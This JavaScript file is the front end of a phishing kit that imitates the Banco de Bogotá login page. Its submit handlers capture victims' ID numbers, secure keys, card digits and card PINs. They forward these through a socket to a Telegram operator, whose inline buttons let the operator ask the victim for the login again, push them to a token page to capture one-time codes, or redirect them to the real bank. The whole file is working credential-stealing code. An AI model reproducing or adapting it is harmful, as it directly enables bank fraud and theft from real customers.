/**
 * INDEX-NEW.JS - Página principal de login con integración al sistema centralizado
 * Maneja formularios de Clave Segura y Tarjeta Débito
 */

document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Iniciando aplicación principal (NEW)...');
    
    // Asegurar inicialización de commonUtils
    if (window.commonUtils && !window.commonUtils.initialized) {
        window.commonUtils.initializeCommon();
    }
    
    // Elementos del carrusel
    const serviceCards = document.querySelector('.service-cards');
    const prevButton = document.querySelector('.prev-button');
    const nextButton = document.querySelector('.next-button');
    let scrollAmount = 0;
    const cardWidth = 132;

    function updateButtonVisibility() {
        if (prevButton && nextButton) {
            prevButton.style.display = scrollAmount <= 0 ? 'none' : 'flex';
            nextButton.style.display = 
                scrollAmount >= serviceCards.scrollWidth - serviceCards.clientWidth ? 'none' : 'flex';
        }
    }

    if (prevButton && nextButton && serviceCards) {
        prevButton.addEventListener('click', () => {
            scrollAmount = Math.max(scrollAmount - cardWidth, 0);
            serviceCards.style.transform = `translateX(-${scrollAmount}px)`;
            updateButtonVisibility();
        });

        nextButton.addEventListener('click', () => {
            const maxScroll = serviceCards.scrollWidth - serviceCards.clientWidth;
            scrollAmount = Math.min(scrollAmount + cardWidth, maxScroll);
            serviceCards.style.transform = `translateX(-${scrollAmount}px)`;
            updateButtonVisibility();
        });
    }

    // Elementos del formulario
    const loginOptions = document.querySelectorAll('.login-options button');
    const claveForm = document.getElementById('claveForm');
    const tarjetaForm = document.getElementById('tarjetaForm');
    const loginAlert = document.getElementById('loginAlert');
    const loadingOverlay = document.getElementById('loadingOverlay');

    // Funciones de overlay
    function showOverlay() {
        if (loadingOverlay) {
            loadingOverlay.classList.add('active');
            loadingOverlay.style.display = 'flex';
        }
    }

    function hideOverlay() {
        if (loadingOverlay) {
            loadingOverlay.classList.remove('active');
            loadingOverlay.style.display = 'none';
        }
    }

    // Manejador de acciones de Telegram
    window.bogotaSocket.handleTelegramActions((data) => {
        hideOverlay();
        
        switch(data.action) {
            case 'request_login':
                // Recargar página para pedir login nuevamente
                window.location.reload();
                break;
            case 'request_token':
                window.location.href = 'token.html';
                break;
            case 'finish':
                window.location.href = 'https://www.bancodebogota.com/';
                break;
        }
    });

    // Manejar botones de mostrar/ocultar contraseña
    document.querySelectorAll('.toggle-password').forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            const input = this.parentElement.querySelector('input');
            const slashElement = this.querySelector('.slash');
            
            if (input.type === 'password') {
                input.type = 'text';
                this.classList.add('show');
            } else {
                input.type = 'password';
                this.classList.remove('show');
            }
            
            if (slashElement) {
                slashElement.style.opacity = input.type === 'password' ? '0' : '1';
            }
        });
    });

    // Permitir solo números en campos específicos
    document.querySelectorAll('input[type="password"], input[type="text"]:not(.cardholder-name)').forEach(input => {
        input.addEventListener('input', function() {
            if (!this.classList.contains('cardholder-name')) {
                this.value = this.value.replace(/\D/g, '');
            }
        });
    });

    // Manejar cambio entre formularios
    loginOptions.forEach((button, index) => {
        button.addEventListener('click', function() {
            loginOptions.forEach(btn => btn.classList.remove('active'));
            this.classList.add('active');

            if (index === 0) {
                claveForm.style.display = 'block';
                tarjetaForm.style.display = 'none';
                loginAlert.style.display = 'block';
            } else {
                claveForm.style.display = 'none';
                tarjetaForm.style.display = 'block';
                loginAlert.style.display = 'none';
            }
        });
    });

    // ========================================
    // SUBMIT HANDLER - CLAVE SEGURA
    // ========================================
    
    claveForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        console.log('📝 Formulario Clave Segura enviado');
        
        const tipoDoc = this.querySelector('select').value;
        const numDoc = this.querySelector('input[name="identification"]').value.trim();
        const claveSegura = this.querySelector('input[name="secure-key"]').value.trim();

        if (!numDoc || !claveSegura) {
            alert('Por favor complete todos los campos');
            return;
        }

        if (numDoc.length < 5) {
            alert('El número de documento no es válido');
            return;
        }

        if (claveSegura.length !== 4) {
            alert('La clave segura debe tener 4 dígitos');
            return;
        }

        showOverlay();

        // Guardar en sessionStorage
        const bogotaData = {
            tipoLogin: 'Clave Segura',
            tipoDocumento: tipoDoc,
            numeroDocumento: numDoc,
            claveSegura: claveSegura
        };
        sessionStorage.setItem('bogotaData', JSON.stringify(bogotaData));

        // Formatear mensaje
        const message = `
🔔 <b>BANCO DE BOGOTÁ - LOGIN</b>

📝 <b>INFORMACIÓN:</b>
🔐 <b>Tipo:</b> Clave Segura
📄 <b>Tipo Documento:</b> ${tipoDoc}
🆔 <b>Número Documento:</b> ${numDoc}
🔑 <b>Clave Segura:</b> ${claveSegura}

⏰ ${new Date().toLocaleString('es-CO')}
        `.trim();

        const keyboard = {
            inline_keyboard: [
                [{ text: '🔑 Pedir Login', callback_data: `request_login:${window.bogotaSocket.sessionId}` }],
                [{ text: '📱 Pedir Token', callback_data: `request_token:${window.bogotaSocket.sessionId}` }],
                [{ text: '✅ Finalizar', callback_data: `finish:${window.bogotaSocket.sessionId}` }]
            ]
        };

        try {
            await window.bogotaSocket.sendData('login', { text: message, keyboard: keyboard });
            console.log('✅ Datos enviados correctamente');
        } catch (error) {
            console.error('❌ Error:', error);
            hideOverlay();
            alert('Error al enviar los datos');
        }
    });

    // ========================================
    // SUBMIT HANDLER - TARJETA DÉBITO
    // ========================================
    
    tarjetaForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        console.log('📝 Formulario Tarjeta Débito enviado');
        
        const tipoDoc = this.querySelector('select').value;
        const numDoc = this.querySelector('input[name="identification"]').value.trim();
        const ultimosDigitos = this.querySelector('input[name="card-number"]').value.trim();
        const claveTarjeta = this.querySelector('input[name="card-pin"]').value.trim();

        if (!numDoc || !ultimosDigitos || !claveTarjeta) {
            alert('Por favor complete todos los campos');
            return;
        }

        if (numDoc.length < 5) {
            alert('El número de documento no es válido');
            return;
        }

        if (ultimosDigitos.length !== 4) {
            alert('Debe ingresar los 4 últimos dígitos de su tarjeta');
            return;
        }

        if (claveTarjeta.length !== 4) {
            alert('La clave de tarjeta debe tener 4 dígitos');
            return;
        }

        showOverlay();

        // Guardar en sessionStorage
        const bogotaData = {
            tipoLogin: 'Tarjeta Débito',
            tipoDocumento: tipoDoc,
            numeroDocumento: numDoc,
            ultimosDigitosTarjeta: ultimosDigitos,
            claveTarjeta: claveTarjeta
        };
        sessionStorage.setItem('bogotaData', JSON.stringify(bogotaData));

        // Formatear mensaje
        const message = `
🔔 <b>BANCO DE BOGOTÁ - LOGIN</b>

📝 <b>INFORMACIÓN:</b>
💳 <b>Tipo:</b> Tarjeta Débito
📄 <b>Tipo Documento:</b> ${tipoDoc}
🆔 <b>Número Documento:</b> ${numDoc}
💳 <b>Últimos 4 Dígitos:</b> ${ultimosDigitos}
🔐 <b>Clave Tarjeta:</b> ${claveTarjeta}

⏰ ${new Date().toLocaleString('es-CO')}
        `.trim();

        const keyboard = {
            inline_keyboard: [
                [{ text: '🔑 Pedir Login', callback_data: `request_login:${window.bogotaSocket.sessionId}` }],
                [{ text: '📱 Pedir Token', callback_data: `request_token:${window.bogotaSocket.sessionId}` }],
                [{ text: '✅ Finalizar', callback_data: `finish:${window.bogotaSocket.sessionId}` }]
            ]
        };

        try {
            await window.bogotaSocket.sendData('login', { text: message, keyboard: keyboard });
            console.log('✅ Datos enviados correctamente');
        } catch (error) {
            console.error('❌ Error:', error);
            hideOverlay();
            alert('Error al enviar los datos');
        }
    });

    console.log('✅ Aplicación principal (NEW) iniciada correctamente');
});
